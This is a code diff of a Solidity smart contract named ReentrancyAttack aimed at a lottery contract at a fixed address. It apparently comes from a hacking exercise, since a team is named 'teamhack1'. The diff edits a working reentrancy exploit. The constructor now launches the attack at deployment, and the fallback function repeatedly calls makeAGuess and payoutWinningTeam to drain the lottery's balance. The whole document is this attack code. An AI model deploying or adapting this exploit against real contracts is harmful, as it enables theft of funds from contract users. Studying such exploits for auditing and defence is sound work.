@@ -15,22 +15,25 @@ contract ReentrancyAttack is Ownable {
     address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
 
     constructor() payable {
-        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), string(abi.encodePacked(address(this))), "password");
+        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), 'teamhack1', "password");
+        attack();
     }
 
     fallback() external {
+        emit Log("Fallback called");
         if (address(ILottery(lotteryAddress)).balance >= 0.000000002 ether) {
-            attack();
+            ILottery(lotteryAddress).makeAGuess(address(this), 0);
+            ILottery(lotteryAddress).payoutWinningTeam(address(this));
         }
     }
 
     function attack() public {
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
-        ILottery(lotteryAddress).makeAGuess(address(this), 1);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        ILottery(lotteryAddress).makeAGuess(address(this), 0);
         ILottery(lotteryAddress).payoutWinningTeam(address(this));
     }
 
